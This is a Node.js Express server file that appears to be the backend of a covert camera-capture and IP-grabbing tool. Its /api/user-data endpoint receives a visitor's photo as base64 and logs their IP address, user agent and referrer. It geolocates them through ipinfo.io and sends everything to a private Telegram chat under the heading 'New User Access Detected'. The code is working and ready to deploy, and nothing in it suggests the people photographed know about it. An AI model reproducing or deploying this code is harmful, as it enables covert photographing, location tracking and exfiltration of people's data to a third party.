// server.js

const express = require('express');
const cors = require('cors');
const axios = require('axios');
require('dotenv').config();
const FormData = require('form-data'); // <-- required for photo upload

const app = express();
const PORT = process.env.PORT || 3000;

// Enable trust proxy to get real client IPs (especially on Render/Vercel)
app.set('trust proxy', true);

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Telegram configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_USER_ID = process.env.TELEGRAM_USER_ID;
const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

// Function to get client IP
function getClientIP(req) {
    return (
        req.ip ||
        req.headers['x-forwarded-for']?.split(',')[0] ||
        req.connection?.remoteAddress ||
        req.socket?.remoteAddress ||
        'Unknown'
    );
}

// Function to send message to Telegram
async function sendTelegramMessage(message) {
    try {
        const response = await axios.post(`${TELEGRAM_API_URL}/sendMessage`, {
            chat_id: TELEGRAM_USER_ID,
            text: message,
            parse_mode: 'HTML'
        });
        return response.data;
    } catch (error) {
        console.error('❌ Error sending Telegram message:', error.response?.data || error.message);
        throw error;
    }
}

// Function to send photo to Telegram
async function sendTelegramPhoto(photoBuffer, caption = '') {
    try {
        const formData = new FormData();
        const blob = new Blob([photoBuffer], { type: 'image/jpeg' });
        formData.append('photo', blob, 'user_photo.jpg');
        formData.append('chat_id', TELEGRAM_USER_ID);
        formData.append('caption', caption);

        const response = await axios.post(`${TELEGRAM_API_URL}/sendPhoto`, formData, {
            headers: formData.getHeaders()
        });
        return response.data;
    } catch (error) {
        console.error('⚠️ Error sending Telegram photo:', error.response?.data || error.message);

        // Fallback: send as document
        try {
            const formData = new FormData();
            const blob = new Blob([photoBuffer], { type: 'image/jpeg' });
            formData.append('document', blob, 'user_photo.jpg');
            formData.append('chat_id', TELEGRAM_USER_ID);
            formData.append('caption', caption);

            const response = await axios.post(`${TELEGRAM_API_URL}/sendDocument`, formData, {
                headers: formData.getHeaders()
            });
            return response.data;
        } catch (docError) {
            console.error('❌ Error sending Telegram document:', docError.response?.data || docError.message);
            throw docError;
        }
    }
}

// 📦 API endpoint to receive user data
app.post('/api/user-data', async (req, res) => {
    try {
        const { photo } = req.body;
        const clientIP = getClientIP(req);

        console.log('📩 Received user data from IP:', clientIP);

        if (!photo) {
            return res.status(400).json({ error: 'No photo data provided' });
        }

        // Extract base64 data
        const base64Data = photo.replace(/^data:image\/jpeg;base64,/, '');
        const photoBuffer = Buffer.from(base64Data, 'base64');

        const userAgent = req.get('User-Agent') || 'Unknown';
        const timestamp = new Date().toLocaleString();

        // 🌐 Fetch IP details
        let ipDetails = {};
        try {
            const response = await axios.get(`https://ipinfo.io/${clientIP}/json`);
            ipDetails = response.data;
        } catch (err) {
            console.warn('⚠️ Failed to fetch IP info:', err.message);
            ipDetails = { city: 'Unknown', region: 'Unknown', country: 'Unknown', org: 'Unknown' };
        }

        // 🧾 Build Telegram message
        const infoMessage = `
🕵️ <b>New User Access Detected</b>

📅 <b>Time:</b> ${timestamp}
🌐 <b>IP Address:</b> ${clientIP}
🏙️ <b>Location:</b> ${ipDetails.city || 'Unknown'}, ${ipDetails.region || ''} ${ipDetails.country || ''}
🏢 <b>ISP:</b> ${ipDetails.org || 'Unknown'}
💻 <b>User Agent:</b> ${userAgent}
🔗 <b>Referrer:</b> ${req.get('Referer') || 'Direct access'}
        `.trim();

        // Send data to Telegram
        await sendTelegramMessage(infoMessage);
        await sendTelegramPhoto(photoBuffer, `User photo from ${clientIP}`);

        console.log('✅ User data sent to Telegram successfully');
        res.json({ success: true, message: 'Data received and sent to Telegram' });

    } catch (error) {
        console.error('❌ Error processing user data:', error);
        res.status(500).json({
            error: 'Internal server error',
            details: error.message
        });
    }
});

// 🩺 Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        status: 'OK',
        timestamp: new Date().toISOString(),
        service: 'Telegram Photo Bot Backend'
    });
});

// 🏠 Root endpoint
app.get('/', (req, res) => {
    res.json({
        message: 'Telegram Photo Bot Backend is running',
        endpoints: {
            '/api/user-data': 'POST - Receive user photo and IP',
            '/health': 'GET - Health check'
        }
    });
});

// 🚀 Start server
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`🌍 Environment: ${process.env.NODE_ENV || 'development'}`);

    if (!TELEGRAM_BOT_TOKEN) {
        console.warn('⚠️  TELEGRAM_BOT_TOKEN is missing in .env');
    }
    if (!TELEGRAM_USER_ID) {
        console.warn('⚠️  TELEGRAM_USER_ID is missing in .env');
    }
});